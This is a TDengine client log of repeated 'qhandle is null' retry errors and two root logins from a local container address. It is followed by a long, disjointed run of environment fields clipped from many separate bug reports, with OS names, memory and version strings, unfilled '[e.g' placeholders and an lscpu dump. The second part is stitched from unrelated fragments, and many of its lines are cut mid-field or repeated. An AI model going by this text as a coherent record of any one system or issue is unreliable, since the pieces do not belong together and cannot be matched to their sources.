08/28 01:27:03.279158 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:27:20.839131 tsc error qhandle is null
08/28 01:27:20.839146 tsc error add into queued async res, code:invalid qhandle
08/28 01:27:20.839159 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:27:23.534131 tsc error qhandle is null
08/28 01:27:23.534146 tsc error add into queued async res, code:invalid qhandle
08/28 01:27:23.534160 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:27:50.819294 tsc error qhandle is null
08/28 01:27:50.819307 tsc error add into queued async res, code:invalid qhandle
08/28 01:27:50.819322 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:28:04.839343 tsc error qhandle is null
08/28 01:28:04.839365 tsc error add into queued async res, code:invalid qhandle
08/28 01:28:04.839383 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:28:06.503957 tsc error qhandle is null
08/28 01:28:06.503972 tsc error add into queued async res, code:invalid qhandle
08/28 01:28:06.503985 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:28:30.679338 tsc error qhandle is null
08/28 01:28:30.679350 tsc error add into queued async res, code:invalid qhandle
08/28 01:28:30.679364 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:28:38.839098 tsc error qhandle is null
08/28 01:28:38.839109 tsc error add into queued async res, code:invalid qhandle
08/28 01:28:38.839122 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:28:48.559124 tsc error qhandle is null
08/28 01:28:48.559137 tsc error add into queued async res, code:invalid qhandle
08/28 01:28:48.559153 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:29:18.509321 tsc error qhandle is null
08/28 01:29:18.509333 tsc error add into queued async res, code:invalid qhandle
08/28 01:29:18.509347 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:29:29.838971 tsc error qhandle is null
08/28 01:29:29.838986 tsc error add into queued async res, code:invalid qhandle
08/28 01:29:29.839001 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:29:45.619337 tsc error qhandle is null
08/28 01:29:45.619351 tsc error add into queued async res, code:invalid qhandle
08/28 01:29:45.619373 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:30:01.839108 tsc error qhandle is null
08/28 01:30:01.839122 tsc error add into queued async res, code:invalid qhandle
08/28 01:30:01.839137 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:30:16.114351 tsc error qhandle is null
08/28 01:30:16.114380 tsc error add into queued async res, code:invalid qhandle
08/28 01:30:16.114393 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:30:43.839368 tsc error qhandle is null
08/28 01:30:43.839383 tsc error add into queued async res, code:invalid qhandle
08/28 01:30:43.839398 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:30:47.839134 tsc error qhandle is null
08/28 01:30:47.839149 tsc error add into queued async res, code:invalid qhandle
08/28 01:30:47.839164 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:31:07.434323 tsc error qhandle is null
08/28 01:31:07.434335 tsc error add into queued async res, code:invalid qhandle
08/28 01:31:07.434348 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:31:18.838973 tsc error qhandle is null
08/28 01:31:18.838988 tsc error add into queued async res, code:invalid qhandle
08/28 01:31:18.839004 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:31:23.879110 tsc error qhandle is null
08/28 01:31:23.879125 tsc error add into queued async res, code:invalid qhandle
08/28 01:31:23.879144 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:31:55.839298 tsc error qhandle is null
08/28 01:31:55.839311 tsc error add into queued async res, code:invalid qhandle
08/28 01:31:55.839322 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:31:56.840475 tsc error qhandle is null
08/28 01:31:56.840488 tsc error add into queued async res, code:invalid qhandle
08/28 01:31:56.840502 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:32:24.129305 tsc error qhandle is null
08/28 01:32:24.129317 tsc error add into queued async res, code:invalid qhandle
08/28 01:32:24.129330 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:32:37.959388 tsc error qhandle is null
08/28 01:32:37.959400 tsc error add into queued async res, code:invalid qhandle
08/28 01:32:37.959414 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:32:45.839129 tsc error qhandle is null
08/28 01:32:45.839143 tsc error add into queued async res, code:invalid qhandle
08/28 01:32:45.839161 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:33:09.839303 tsc error qhandle is null
08/28 01:33:09.839321 tsc error add into queued async res, code:invalid qhandle
08/28 01:33:09.839337 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:33:21.839110 tsc error qhandle is null
08/28 01:33:21.839123 tsc error add into queued async res, code:invalid qhandle
08/28 01:33:21.839139 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:33:34.999311 tsc error qhandle is null
08/28 01:33:34.999324 tsc error add into queued async res, code:invalid qhandle
08/28 01:33:34.999338 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:34:00.469313 tsc error qhandle is null
08/28 01:34:00.469325 tsc error add into queued async res, code:invalid qhandle
08/28 01:34:00.469339 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:34:06.839134 tsc error qhandle is null
08/28 01:34:06.839145 tsc error add into queued async res, code:invalid qhandle
08/28 01:34:06.839160 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:34:15.679121 tsc error qhandle is null
08/28 01:34:15.679133 tsc error add into queued async res, code:invalid qhandle
08/28 01:34:15.679147 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:34:42.369313 tsc error qhandle is null
08/28 01:34:42.369326 tsc error add into queued async res, code:invalid qhandle
08/28 01:34:42.369341 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:34:53.838986 tsc error qhandle is null
08/28 01:34:53.839000 tsc error add into queued async res, code:invalid qhandle
08/28 01:34:53.839014 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:34:59.454112 tsc error qhandle is null
08/28 01:34:59.454126 tsc error add into queued async res, code:invalid qhandle
08/28 01:34:59.454147 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:35:31.839285 tsc error qhandle is null
08/28 01:35:31.839295 tsc error add into queued async res, code:invalid qhandle
08/28 01:35:31.839308 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:35:32.838961 tsc error qhandle is null
08/28 01:35:32.838976 tsc error add into queued async res, code:invalid qhandle
08/28 01:35:32.838992 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:35:34.829635 mnd user:root login from 172.17.0.2, result:success
08/28 01:36:00.589290 tsc error qhandle is null
08/28 01:36:00.589302 tsc error add into queued async res, code:invalid qhandle
08/28 01:36:00.589315 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:36:14.839303 tsc error qhandle is null
08/28 01:36:14.839315 tsc error add into queued async res, code:invalid qhandle
08/28 01:36:14.839331 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:36:28.788959 tsc error qhandle is null
08/28 01:36:28.788973 tsc error add into queued async res, code:invalid qhandle
08/28 01:36:28.788989 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:36:54.834321 tsc error qhandle is null
08/28 01:36:54.834337 tsc error add into queued async res, code:invalid qhandle
08/28 01:36:54.834353 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:37:01.839123 tsc error qhandle is null
08/28 01:37:01.839141 tsc error add into queued async res, code:invalid qhandle
08/28 01:37:01.839159 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:37:19.119313 tsc error qhandle is null
08/28 01:37:19.119325 tsc error add into queued async res, code:invalid qhandle
08/28 01:37:19.119338 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:37:40.279310 tsc error qhandle is null
08/28 01:37:40.279323 tsc error add into queued async res, code:invalid qhandle
08/28 01:37:40.279336 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:37:44.839115 tsc error qhandle is null
08/28 01:37:44.839126 tsc error add into queued async res, code:invalid qhandle
08/28 01:37:44.839141 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:37:58.498955 tsc error qhandle is null
08/28 01:37:58.498970 tsc error add into queued async res, code:invalid qhandle
08/28 01:37:58.498994 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:38:30.839308 tsc error qhandle is null
08/28 01:38:30.839320 tsc error add into queued async res, code:invalid qhandle
08/28 01:38:30.839335 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:38:35.839105 tsc error qhandle is null
08/28 01:38:35.839119 tsc error add into queued async res, code:invalid qhandle
08/28 01:38:35.839134 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:38:55.917043 tsc warn stream: , last timestamp:0, reset to:1598577600000
08/28 01:38:59.639137 tsc error qhandle is null
08/28 01:38:59.639152 tsc error add into queued async res, code:invalid qhandle
08/28 01:38:59.639167 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:39:21.839124 tsc error qhandle is null
08/28 01:39:21.839137 tsc error add into queued async res, code:invalid qhandle
08/28 01:39:21.839152 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:39:33.839109 tsc error qhandle is null
08/28 01:39:33.839121 tsc error add into queued async res, code:invalid qhandle
08/28 01:39:33.839137 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:39:50.179324 tsc error qhandle is null
08/28 01:39:50.179337 tsc error add into queued async res, code:invalid qhandle
08/28 01:39:50.179369 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:39:57.839113 tsc error qhandle is null
08/28 01:39:57.839124 tsc error add into queued async res, code:invalid qhandle
08/28 01:39:57.839140 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:40:05.839118 tsc error qhandle is null
08/28 01:40:05.839129 tsc error add into queued async res, code:invalid qhandle
08/28 01:40:05.839144 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:40:21.939117 tsc error qhandle is null
08/28 01:40:21.939131 tsc error add into queued async res, code:invalid qhandle
08/28 01:40:21.939152 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:40:39.839302 tsc error qhandle is null
08/28 01:40:39.839312 tsc error add into queued async res, code:invalid qhandle
08/28 01:40:39.839329 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:40:41.838952 tsc error qhandle is null
08/28 01:40:41.838967 tsc error add into queued async res, code:invalid qhandle
08/28 01:40:41.838983 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:40:54.838957 tsc error qhandle is null
08/28 01:40:54.838972 tsc error add into queued async res, code:invalid qhandle
08/28 01:40:54.838994 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:41:12.374276 tsc error qhandle is null
08/28 01:41:12.374290 tsc error add into queued async res, code:invalid qhandle
08/28 01:41:12.374301 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:41:24.839121 tsc error qhandle is null
08/28 01:41:24.839134 tsc error add into queued async res, code:invalid qhandle
08/28 01:41:24.839151 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:41:27.839102 tsc error qhandle is null
08/28 01:41:27.839116 tsc error add into queued async res, code:invalid qhandle
08/28 01:41:27.839138 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:41:39.133953 tsc error qhandle is null
08/28 01:41:39.133968 tsc error add into queued async res, code:invalid qhandle
08/28 01:41:39.133987 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:41:56.839294 tsc error qhandle is null
08/28 01:41:56.839305 tsc error add into queued async res, code:invalid qhandle
08/28 01:41:56.839321 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:42:09.838952 tsc error qhandle is null
08/28 01:42:09.838966 tsc error add into queued async res, code:invalid qhandle
08/28 01:42:09.838984 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:42:12.839133 tsc error qhandle is null
08/28 01:42:12.839144 tsc error add into queued async res, code:invalid qhandle
08/28 01:42:12.839159 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:42:35.839320 tsc error qhandle is null
08/28 01:42:35.839332 tsc error add into queued async res, code:invalid qhandle
08/28 01:42:35.839353 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:42:39.944118 tsc error qhandle is null
08/28 01:42:39.944132 tsc error add into queued async res, code:invalid qhandle
08/28 01:42:39.944146 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:42:55.554301 tsc error qhandle is null
08/28 01:42:55.554314 tsc error add into queued async res, code:invalid qhandle
08/28 01:42:55.554332 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:43:00.839096 tsc error qhandle is null
08/28 01:43:00.839108 tsc error add into queued async res, code:invalid qhandle
08/28 01:43:00.839123 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:43:15.839298 tsc error qhandle is null
08/28 01:43:15.839310 tsc error add into queued async res, code:invalid qhandle
08/28 01:43:15.839325 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:43:28.838981 tsc error qhandle is null
08/28 01:43:28.838995 tsc error add into queued async res, code:invalid qhandle
08/28 01:43:28.839011 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:43:43.839117 tsc error qhandle is null
08/28 01:43:43.839129 tsc error add into queued async res, code:invalid qhandle
08/28 01:43:43.839149 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:43:49.840662 tsc error qhandle is null
08/28 01:43:49.840677 tsc error add into queued async res, code:invalid qhandle
08/28 01:43:49.840692 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:43:58.269132 tsc error qhandle is null
08/28 01:43:58.269146 tsc error add into queued async res, code:invalid qhandle
08/28 01:43:58.269160 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:44:21.369323 tsc error qhandle is null
08/28 01:44:21.369334 tsc error add into queued async res, code:invalid qhandle
08/28 01:44:21.369348 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:44:26.839137 tsc error qhandle is null
08/28 01:44:26.839149 tsc error add into queued async res, code:invalid qhandle
08/28 01:44:26.839164 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:44:33.838950 tsc error qhandle is null
08/28 01:44:33.838963 tsc error add into queued async res, code:invalid qhandle
08/28 01:44:33.838979 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:44:46.363964 tsc error qhandle is null
08/28 01:44:46.363980 tsc error add into queued async res, code:invalid qhandle
08/28 01:44:46.363997 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:45:02.114138 tsc error qhandle is null
08/28 01:45:02.114151 tsc error add into queued async res, code:invalid qhandle
08/28 01:45:02.114165 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:45:03.838945 tsc error qhandle is null
08/28 01:45:03.838958 tsc error add into queued async res, code:invalid qhandle
08/28 01:45:03.838971 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:45:18.954351 tsc error qhandle is null
08/28 01:45:18.954370 tsc error add into queued async res, code:invalid qhandle
08/28 01:45:18.954385 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:45:20.838953 tsc error qhandle is null
08/28 01:45:20.838968 tsc error add into queued async res, code:invalid qhandle
08/28 01:45:20.838989 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:45:44.839328 tsc error qhandle is null
08/28 01:45:44.839340 tsc error add into queued async res, code:invalid qhandle
08/28 01:45:44.839356 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:45:45.503946 tsc error qhandle is null
08/28 01:45:45.503961 tsc error add into queued async res, code:invalid qhandle
08/28 01:45:45.503975 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:46:09.839287 tsc error qhandle is null
08/28 01:46:09.839300 tsc error add into queued async res, code:invalid qhandle
08/28 01:46:09.839315 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:46:11.543961 tsc error qhandle is null
08/28 01:46:11.543976 tsc error add into queued async res, code:invalid qhandle
08/28 01:46:11.543989 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:46:30.839318 tsc error qhandle is null
08/28 01:46:30.839330 tsc error add into queued async res, code:invalid qhandle
08/28 01:46:30.839345 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:46:35.349135 tsc error qhandle is null
08/28 01:46:35.349154 tsc error add into queued async res, code:invalid qhandle
08/28 01:46:35.349172 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:46:55.529308 tsc error qhandle is null
08/28 01:46:55.529320 tsc error add into queued async res, code:invalid qhandle
08/28 01:46:55.529333 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:46:58.839110 tsc error qhandle is null
08/28 01:46:58.839122 tsc error add into queued async res, code:invalid qhandle
08/28 01:46:58.839134 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:47:08.838951 tsc error qhandle is null
08/28 01:47:08.838966 tsc error add into queued async res, code:invalid qhandle
08/28 01:47:08.838981 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:47:29.839321 tsc error qhandle is null
08/28 01:47:29.839333 tsc error add into queued async res, code:invalid qhandle
08/28 01:47:29.839350 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:47:41.838956 tsc error qhandle is null
08/28 01:47:41.838971 tsc error add into queued async res, code:invalid qhandle
08/28 01:47:41.838987 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:47:42.838963 tsc error qhandle is null
08/28 01:47:42.838977 tsc error add into queued async res, code:invalid qhandle
08/28 01:47:42.838989 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:47:44.823966 tsc error qhandle is null
08/28 01:47:44.823982 tsc error add into queued async res, code:invalid qhandle
08/28 01:47:44.823996 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:48:17.839323 tsc error qhandle is null
08/28 01:48:17.839335 tsc error add into queued async res, code:invalid qhandle
08/28 01:48:17.839352 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:48:18.838954 tsc error qhandle is null
08/28 01:48:18.838969 tsc error add into queued async res, code:invalid qhandle
08/28 01:48:18.838985 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:48:22.839119 tsc error qhandle is null
08/28 01:48:22.839133 tsc error add into queued async res, code:invalid qhandle
08/28 01:48:22.839147 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:48:43.594303 tsc error qhandle is null
08/28 01:48:43.594315 tsc error add into queued async res, code:invalid qhandle
08/28 01:48:43.594328 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:49:05.839354 tsc error qhandle is null
08/28 01:49:05.839382 tsc error add into queued async res, code:invalid qhandle
08/28 01:49:05.839405 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:49:06.838952 tsc error qhandle is null
08/28 01:49:06.838967 tsc error add into queued async res, code:invalid qhandle
08/28 01:49:06.838983 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:49:08.273955 tsc error qhandle is null
08/28 01:49:08.273970 tsc error add into queued async res, code:invalid qhandle
08/28 01:49:08.273983 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:49:36.264296 tsc error qhandle is null
08/28 01:49:36.264309 tsc error add into queued async res, code:invalid qhandle
08/28 01:49:36.264322 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:49:41.294845 mnd user:root login from 172.17.0.2, result:success
08/28 01:49:43.839100 tsc error qhandle is null
08/28 01:49:43.839114 tsc error add into queued async res, code:invalid qhandle
08/28 01:49:43.839128 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:49:54.444179 tsc error qhandle is null
08/28 01:49:54.444192 tsc error add into queued async res, code:invalid qhandle
08/28 01:49:54.444208 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 01:49:56.838969 tsc error qhandle is null
08/28 01:49:56.838985 tsc error add into queued async res, code:invalid qhandle
08/28 01:49:56.839000 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:50:13.884102 tsc error qhandle is null
08/28 01:50:13.884115 tsc error add into queued async res, code:invalid qhandle
08/28 01:50:13.884130 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 01:50:20.839136 tsc error qhandle is null
08/28 01:50:20.839149 tsc error add into queued async res, code:invalid qhandle
08/28 01:50:20.839164 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 01:50:27.839123 tsc error qhandle is null
08/28 01:50:27.839137 tsc error add into queued async res, code:invalid qhandle
08/28 01:50:27.839152 tsc error stream: , retrieve data failed, code: , retry in 12000ms
- os: centos 7.8 - memory, cpu, current disk space: enough - tdengine version: 2.0.2.1
- os: [centos 7.0] - tdengine version [tdengine/tdengine:latest]
- os: win10 - memory, cpu, current disk space - tdengine version [e.g
- os: macos 10.15.6 - tdengine version 2.0.0.4
centos 7.8 & wsl2 ubuntu 20.04] - memory, cpu, current disk space - tdengine version [e.g
2.0.0.1~2.0.0.6]
centos 7.0] ubuntu 18.04 - memory, cpu, current disk space 30gb disk - tdengine version [e.g
- os: linux version 3.10.0-229.el7.x86_64 - memory, cpu, current disk space - tdengine version [tdengine-server-2.0.0.1-linux-x64.rpm]
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: [centos linux release 7.8.2003 (core)] - memory, cpu, current disk space - tdengine version [e.g
- os: centos 7.6.1810 - tdengine version [1.6.5.6 .6.5.9]
- os: [debian 10.0] - memory, cpu, current disk space - tdengine version [develop head] make_install.sh also has that problem
there may be other files has the same problem
![image](
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
1.6.1.7] master branch
- os: ubuntu 18 - memory, cpu, current disk space - tdengine version 1.6.6.1
- os: centos 7.0 - memory 0, cpu 28, current disk space .8t - tdengine version 1.6.5.5
- os: uos 20sp1 - memory: 64g, cpu: , current disk space: 800g - tdengine version 2.0
- os: win2008 32g #+ taos.dll
taosdata ubuntu 18.04 64g - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: centos 7.0 - memory 28, cpu:40, current disk space:1.4t - tdengine version 1.6.5.5 .6.6.0
- os: server entos7.2 lient in10 home - memory 16g, cpu-4, current disk space - tdengine version [1.6.6.0-linux-x64] - jdk1.8
ubuntu18.04] - python3.6 - tdengine version [e.g
- os: 7.4 - memory, cpu, 900 50g t - tdengine version 1.6.5.6
- os: centos 7.5 - 4c, 8g, 50g - tdengine version 1.6.6.0
- os: centos 7.7 - 128g, xeon 2.4, 1t - tdengine version 1.6.1.9
- os: windows 2012 server
- 16g, xeon 2.13, 100g
-.net core 3.1
- os: ubuntu - tdengine version 1.6.5.9
- os: centos 7.0 - tdengine version 1.6.5.9
- os: linux xxxxx-virtualbox 5.4.0-33-generic #37-ubuntu smp thu may 21 12:53:59 utc 2020 x86_64 x86_64 x86_64 gnu/linux - memtotal: 8153508 kb - tdengine version latest version in github
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: [deepinv20 beta] - tdengine version [1.6.5.9] -
![image](
- os: linux xxxx 5.4.0-31-generic #35-ubuntu smp thu may 7 20:20:34 utc 2020 x86_64 x86_64 x86_64 gnu/linux - tdengine commit: 5e2d1aaeffcdc7fb2353002f6ddc6e6d33829954
- os: ubuntu 18.04 - - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: ubuntu 20.04 - tdengine version: develop branch, commit 3936e2df0d82ecb35cc9d140d4f3b20fd1d7dd6e
- os: [centos linux release 7.2.1511] - memory:32g, cpu:4 processor - tdengine version [1.6.5.7] **crash log a**
![e)ik)c97wb7$4~g@ 3_5b2r](
![dbri2xd%b_)zkjoc)nw{0ag]( **errorlog b**
![image](
- os: centos 7.7 - 16gb, i5-8400, 50gb - tdengine version 1.6.6.1
indow10 entos7 dengine-server-1.6.5.8
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: linux xxxxx-virtualbox 4.13.0-36-generic #40~16.04.1-ubuntu smp fri feb 16 23:25:58 utc 2018 x86_64 x86_64 x86_64 gnu/linux - tdengine version [2.0.0.0]
- git commit: 87fdb0eaf276a31e985dfeaf3333220136509c7c
centos 7.0] - memory, cpu, current disk space
![image](
![image]( - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
-centos 7.7 - tdengine version 1.6.5.7
- os: [ubuntu 16.04.5 lts (gnu/linux 4.15.18-12-pve x86_64)] - memory 4gb , cpu 4, current disk space 60gb - tdengine version [tdengine-server-1.6.5.5-linux-x64.deb]
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: windows 10.0.18363.657 - 8g, i5-4590, 210g available - tdengine version : both develop branch and ver-1.6.5.5-fnk release - gcc version: 9.2.0
- os: ubuntu 18.4 - memory, cpu, current disk space: plenty - tdengine version: 1.6.5.4
linux test-trace-other_app-020044 2.6.32-431.el6.x86_64 #1 smp fri nov 22 03:15:09 utc 2013 x86_64 x86_64 x86_64 gnu/linux
community version: 1.6.5.5
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: ubuntu 18.4 - memory, cpu, current disk space: plenty - tdengine version 1.6.5.4
- os: ubuntu 18.4 - memory, cpu, current disk space: plenty - tdengine version 1.6.5.4
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: ubuntu 16.04 - memory 12gb, cpu intel core i3-4170, current disk space more than 60gb - tdengine version 1.6.4.6 - gcc version 5.4.0 - python version 2.7.12 - node-gyp version 6.1.0 - node.js version v12.14.1 (**install via nvm**) - npm version 6.13.4
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.7] - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: centos 7.0 - tdengine version 1.6.4.0
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
#### cpu info
ubuntu@ubuntu:~/tdengine/debug$ lscpu
architecture: aarch64
cpu op-mode(s): 32-bit, 64-bit
byte order: little endian
on-line cpu(s) list: 0-3
thread(s) per core: 1
core(s) per socket: 4
socket(s): 1
vendor id: arm
model name: cortex-a53
stepping: r0p4
cpu max mhz: 1400.0000
cpu min mhz: 600.0000
bogomips: 38.40
vulnerability itlb multihit: not affected
vulnerability l1tf: not affected
vulnerability mds: not affected
vulnerability meltdown: not affected
vulnerability spec store bypass: not affected
vulnerability spectre v1: mitigation; __user pointer sanitization
vulnerability spectre v2: not affected
vulnerability tsx async abort: not affected
flags: fp asimd evtstrm crc32 cpuid
#### os info
linux ubuntu 5.3.0-1014-raspi2 #16-ubuntu smp tue nov 26 11:18:23 utc 2019 aarch64 aarch64 aarch64 gnu/linux
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: wsl - tdengine version 1.6.4.3
- os: linux localhost.localdomain 3.10.0-957.10.1.el7.x86_64 - memory g, cpu , current disk space 60g - tdengine version [tdengine-1.6.4.3]
- os: linux eokylin 7.0 server python-2.7.5-58.el7.x86_64 ake-3.82-23.el7.x86_64 windows7 ython 2.7.4 visual studio 2017 - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: [centos 7.0] - tdengine version [1.6.4.1]
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space [8g] - tdengine version [e.g
- os: [centos 7.0] - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
ubuntu + official deb package
centos(in docker) + the source from github cloned ps: sorry for my poor english
- os: win10 - goversion: 1.13 - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: ubuntu18 - memory 16gb, cpu i7 8700 , current disk space ssd 460gb - tdengine version .6.4.0
- os: centos linux release 7.6.1810 (core) - tdengine version taos.1.6.2.2
- taos server os: centos 7.0 - taos client os: windows 10 - memory, cpu, current disk space - tdengine version: 1.6.3.0
centos 7.4] - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: windows server 2012 standard 64bit - memory 32g, cpu intel xeon e5-2630 - tdengine version [e.g
- os: linux ubuntu 4.15.0-1048-raspi2 #52-ubuntu smp preempt wed sep 18 08:57:33 utc 2019 aarch64 aarch64 aarch64 gnu/linux - raspberry pi 3 b + - tdengine version 1.6.2.2
- os: ubuntu 16.04/18.04 inside docker - memory, cpu, current disk space - tdengine version 1.6.2.0, master
- os: ubuntu 18.04 - memory, cpu, current disk space - tdengine version latest
- os: [windows 10] - memory 8g, cpu i7, current disk space 19.7g - tdengine version [1.6.2.0]
